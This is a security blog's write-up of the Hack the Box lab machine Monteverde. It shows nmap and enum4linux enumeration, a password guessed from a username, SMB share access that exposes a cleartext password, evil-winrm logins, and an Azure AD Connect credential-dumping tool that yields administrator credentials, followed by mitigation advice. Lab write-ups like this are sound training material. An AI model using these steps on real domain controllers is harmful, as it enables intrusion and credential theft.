<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - Monteverde" /><meta property="og:locale" content="en" /><meta name="description" content="This is my write-up for the HackTheBox Windows machine Monteverde." /><meta property="og:description" content="This is my write-up for the HackTheBox Windows machine Monteverde." /><link rel="canonical" href="https://tid4l.github.io/posts/HTB-Monteverde/" /><meta property="og:url" content="https://tid4l.github.io/posts/HTB-Monteverde/" /><meta property="og:site_name" content="TidalSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-05-29T13:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack the Box - Monteverde" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-05-29T13:00:00-05:00","datePublished":"2020-05-29T13:00:00-05:00","description":"This is my write-up for the HackTheBox Windows machine Monteverde.","headline":"Hack the Box - Monteverde","mainEntityOfPage":{"@type":"WebPage","@id":"https://tid4l.github.io/posts/HTB-Monteverde/"},"url":"https://tid4l.github.io/posts/HTB-Monteverde/"}</script><title>Hack the Box - Monteverde | TidalSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="TidalSec"><meta name="application-name" content="TidalSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avi/avi.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">TidalSec</a></div><div class="site-subtitle font-italic">Cybersecurity.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tid4l" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack the Box - Monteverde</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - Monteverde</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Chris</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1590775200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2020-05-29 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1170 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><p>This is my write-up for the HackTheBox Windows machine <em>Monteverde</em>.</p><hr /><blockquote class="prompt-warning"><div><p>These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.</p></div></blockquote><p><img data-src="/assets/img/posts/htb/05-2020-3/info.PNG" alt="" data-proofer-ignore> <em>Task: Find <a href="#user-flag">user.txt</a> and <a href="#root-flag">root.txt</a></em></p><h2 id="penetration-methodologies"><span class="mr-2">Penetration Methodologies</span><a href="#penetration-methodologies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><strong>Scanning</strong></p><ul><li>nmap</ul><p><strong>Enumeration</strong></p><ul><li><p>enum4linux</p><li><p>SMB Share enumeration</p></ul><p><strong>Exploitation</strong></p><ul><li><p>Weak password policy</p><li><p>Stored plaintext password</p></ul><p><strong>Priv Esc</strong></p><ul><li>Azure AD Connect Service Privileged Account</ul><h2 id="user-flag"><span class="mr-2">User Flag</span><a href="#user-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Our first step is to run an <code class="language-plaintext highlighter-rouge">nmap</code> scan. <em>Monteverde</em> is running a lot of services, which may indicate a Active Directory DC.</p><ul><li><p><strong>sC</strong>: Enable common scripts</p><li><p><strong>sV</strong>: version and service on the port</p><li><p><strong>O</strong>: remote OS detection using fingerprinting</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre># Nmap 7.80 scan initiated Thu May 28 15:05:20 2020 as: nmap -O -sV -sC -oN init172.txt 10.10.10.172
Nmap scan report for 10.10.10.172
Host is up (0.059s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-05-28 19:18:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/28%Time=5ED01992%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -46m55s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-05-28T19:21:03
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 28 15:10:35 2020 -- 1 IP address (1 host up) scanned in 315.60 seconds
</pre></table></code></div></div><p>After the results come back, we also run a full port scan to see if any additional ports may be open.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-O</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nt">-oN</span> full172.txt 10.10.10.172
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</pre></table></code></div></div><p>The port that we make note of from the full scan is 5985. This tells us that the box is running WinRM 2.0 (Microsoft Windows Remote Management). Once we find some credentials, we may be able to gain a foothold through this service.</p><p>Next, we’ll run <code class="language-plaintext highlighter-rouge">enum4linux</code>, a tool primarily used to enumerate Windows or Samba systems.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>enum4linux <span class="nt">-U</span> <span class="nt">-o</span> 10.10.10.169
</pre></table></code></div></div><p>One of the most crucial items we receive from <code class="language-plaintext highlighter-rouge">enum4linux</code> are users on the system. Two users stand out and are not like the others: AAD__987d7f2f57d2 and SABatchJobs.</p><p><img data-src="/assets/img/posts/htb/05-2020-3/enum-users.png" alt="" data-proofer-ignore></p><p>More enumeration doesn’t yield much information and we don’t have any potential passwords. HackTheBox doesn’t generally encourage bruteforcing credentials, so we’ll try to use the two usernames from earlier as their own passwords.</p><p>We have two potential services that accept logins, SMB and WinRM. We’ll first try AMB. We can use <code class="language-plaintext highlighter-rouge">smbclient</code> to <a href="https://www.computerhope.com/unix/smbclien.htm">enumerate shares</a> on <em>Monteverde</em>, but only if we have valid credentials. Fortunately, using the command and credentials below, we can sucessfully view the available shares.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>smbclient <span class="nt">-L</span> 10.10.10.172 <span class="nt">-U</span> SABatchJobs%SABatchJobs
</pre></table></code></div></div><p>The available shared resources are displayed. Let’s enumerate some of the file system.</p><p><img data-src="/assets/img/posts/htb/05-2020-3/shares.png" alt="" data-proofer-ignore></p><p>We’ll connect to the various shares with <code class="language-plaintext highlighter-rouge">smbclient</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>smbclient <span class="se">\\\\</span>10.10.10.172<span class="se">\\</span><span class="nb">users</span><span class="nv">$ </span><span class="nt">-U</span> SABatchJobs%SABatchJob
</pre></table></code></div></div><p>Within the <code class="language-plaintext highlighter-rouge">users$</code> share we find multiple user folders. With some poking around we discover that the user mhope has an interesting xml file. Using the <code class="language-plaintext highlighter-rouge">get</code> command, we can retrieve it. Opening it, we find a password stored in cleartext.</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nt">&lt;Objs</span> <span class="na">Version=</span><span class="s">"1.1.0.1"</span> <span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/powershell/2004/04"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;Obj</span> <span class="na">RefId=</span><span class="s">"0"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;TN</span> <span class="na">RefId=</span><span class="s">"0"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;T&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span class="nt">&lt;/T&gt;</span>
      <span class="nt">&lt;T&gt;</span>System.Object<span class="nt">&lt;/T&gt;</span>
    <span class="nt">&lt;/TN&gt;</span>
    <span class="nt">&lt;ToString&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span class="nt">&lt;/ToString&gt;</span>
    <span class="nt">&lt;Props&gt;</span>
      <span class="nt">&lt;DT</span> <span class="na">N=</span><span class="s">"StartDate"</span><span class="nt">&gt;</span>2020-01-03T05:35:00.7562298-08:00<span class="nt">&lt;/DT&gt;</span>
      <span class="nt">&lt;DT</span> <span class="na">N=</span><span class="s">"EndDate"</span><span class="nt">&gt;</span>2054-01-03T05:35:00.7562298-08:00<span class="nt">&lt;/DT&gt;</span>
      <span class="nt">&lt;G</span> <span class="na">N=</span><span class="s">"KeyId"</span><span class="nt">&gt;</span>00000000-0000-0000-0000-000000000000<span class="nt">&lt;/G&gt;</span>
      <span class="nt">&lt;S</span> <span class="na">N=</span><span class="s">"Password"</span><span class="nt">&gt;</span>4n0therD4y@n0th3r$<span class="nt">&lt;/S&gt;</span>
    <span class="nt">&lt;/Props&gt;</span>
  <span class="nt">&lt;/Obj&gt;</span>
<span class="nt">&lt;/Objs&gt;</span>
</pre></table></code></div></div><p>We can only assume that this belongs to the user mhope. With luck, this user also uses the same password across services. Let’s leave the shares behind for now and return to attempt remote access using WinRM.</p><p>With the help of <code class="language-plaintext highlighter-rouge">evil-winrm</code>, a Windows Remote Management tool for pentesting, we gain a foothold on the machine.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.10.10.172 <span class="nt">-u</span> mhope <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span>
</pre></table></code></div></div><p>On the user’s desktop, we’ll find our first flag!</p><p><img data-src="/assets/img/posts/htb/05-2020-3/user-flag.png" alt="" data-proofer-ignore></p><h2 id="root-flag"><span class="mr-2">Root Flag</span><a href="#root-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now that we have remote access to a user on the system, we need to see what permissions this account has and what groups they are apart of. Let’s use the command <code class="language-plaintext highlighter-rouge">net user</code> to start.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">mhope</span><span class="w">
</span><span class="p">[</span><span class="o">...</span><span class="p">]</span><span class="w">
</span><span class="n">Global</span><span class="w"> </span><span class="nx">Group</span><span class="w"> </span><span class="nx">memberships</span><span class="w">     </span><span class="o">*</span><span class="nx">Azure</span><span class="w"> </span><span class="nx">Admins</span><span class="w">         </span><span class="o">*</span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Users</span><span class="w">
</span></pre></table></code></div></div><p>I omitted some of the results, but it looks like the user mhope is apart of the <code class="language-plaintext highlighter-rouge">Azure Admins</code> group. After some research on a potential CVE, we’ll find <a href="https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/">this article</a>, which provides great information on an exploit that allows a user to retrieve plaintext credentials of the privileged account being utilized by the Azure AD Connect.</p><p>Let’s download the two files <code class="language-plaintext highlighter-rouge">AdDecrypt.exe</code> and <code class="language-plaintext highlighter-rouge">mcrypt.dll</code> and uploaded them to <em>Monteverde</em> using the built-in <code class="language-plaintext highlighter-rouge">upload</code> feature on <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</p><p><img data-src="/assets/img/posts/htb/05-2020-3/uploads.png" alt="" data-proofer-ignore></p><p>Afterwards, we’ll navigate to the <code class="language-plaintext highlighter-rouge">Microsoft Azure AD Sync\Bin</code> directory, and run the executable.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="err">&gt;</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="err">“</span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\Microsoft</span><span class="w"> </span><span class="nx">Azure</span><span class="w"> </span><span class="nx">AD</span><span class="w"> </span><span class="nx">Sync\Bin</span><span class="err">”</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">C:\Users\mhope\AdDecrypt.exe</span><span class="w"> </span><span class="nt">-FullSQL</span><span class="w">
</span></pre></table></code></div></div><p>Pretty quickly we receive credentials. Fortunately for us, they are for the administrator account!</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="o">======================</span><span class="w">
</span><span class="n">AZURE</span><span class="w"> </span><span class="nx">AD</span><span class="w"> </span><span class="nx">SYNC</span><span class="w"> </span><span class="nx">CREDENTIAL</span><span class="w"> </span><span class="nx">DECRYPTION</span><span class="w"> </span><span class="nx">TOOL</span><span class="w">
</span><span class="n">Based</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">original</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="nx">from:</span><span class="w"> </span><span class="nx">https://github.com/fox-it/adconnectdump</span><span class="w">
</span><span class="o">======================</span><span class="w">

</span><span class="n">Opening</span><span class="w"> </span><span class="nx">database</span><span class="w"> </span><span class="nx">connection...</span><span class="w">
</span><span class="n">Executing</span><span class="w"> </span><span class="nx">SQL</span><span class="w"> </span><span class="nx">commands...</span><span class="w">
</span><span class="n">Closing</span><span class="w"> </span><span class="nx">database</span><span class="w"> </span><span class="nx">connection...</span><span class="w">
</span><span class="n">Decrypting</span><span class="w"> </span><span class="nx">XML...</span><span class="w">
</span><span class="n">Parsing</span><span class="w"> </span><span class="nx">XML...</span><span class="w">
</span><span class="n">Finished</span><span class="o">!</span><span class="w">

</span><span class="n">DECRYPTED</span><span class="w"> </span><span class="nx">CREDENTIALS:</span><span class="w">
</span><span class="n">Username:</span><span class="w"> </span><span class="nx">administrator</span><span class="w">
</span><span class="n">Password:</span><span class="w"> </span><span class="nx">d0m</span><span class="err">@</span><span class="nx">in4dminyeah</span><span class="o">!</span><span class="w">
</span><span class="n">Domain:</span><span class="w"> </span><span class="nx">MEGABANK.LOCAL</span><span class="w">
</span></pre></table></code></div></div><p>We can once again connect to the machine, this time with our newly attained credentials.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.10.10.172 <span class="nt">-u</span> administrator <span class="nt">-p</span> <span class="s1">'d0m@in4dminyeah!'</span>
</pre></table></code></div></div><p>Let’s navigate to the Administrator desktop and collect the flag. <em>Monteverde</em> rooted!</p><p><img data-src="/assets/img/posts/htb/05-2020-3/root-flag.png" alt="" data-proofer-ignore></p><hr /><h2 id="mitigation"><span class="mr-2">Mitigation</span><a href="#mitigation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><p>Don’t use default or weak passwords, specifically, enforce strong policies, even on service accounts (especially on service accounts). Avoid using the same password across multiple services.</p><li><p>Patch management; Azure AD Connect should be updated when patches are available and proved stable.</p><li><p>Additionally, the accounts used for services should be dedicated service accounts and not an administrator account (principle of least privilege).</p></ul><h2 id="final-thoughts"><span class="mr-2">Final Thoughts</span><a href="#final-thoughts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This was a fun box. At the time of this write-up, SMB is not one of my strengths, and I enjoy learning new ways of interacting with it. I also liked enumerating the machine, I can never get enough Windows enumeration. The password discovery at the beginning also felt realistic, lazy administrators may not consider the consequences of poor password practices on service accounts.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - Monteverde - TidalSec&amp;url=https://tid4l.github.io/posts/HTB-Monteverde/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - Monteverde - TidalSec&amp;u=https://tid4l.github.io/posts/HTB-Monteverde/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://tid4l.github.io/posts/HTB-Monteverde/&amp;text=Hack the Box - Monteverde - TidalSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/First-Post-and-Obligatory-Blog-Walkthrough/">First Post and Obligatory Blog Walkthrough</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Sauna/"><div class="card-body"> <em class="timeago small" data-ts="1591466400" > 2020-06-06 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Sauna</h3><div class="text-muted small"><p> This is my guide to the HackTheBox Windows machine Sauna. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t atte...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Remote/"><div class="card-body"> <em class="timeago small" data-ts="1593799200" > 2020-07-03 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Remote</h3><div class="text-muted small"><p> This writeup is for the HackTheBox Windows machine Remote. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t att...</p></div></div></a></div><div class="card"> <a 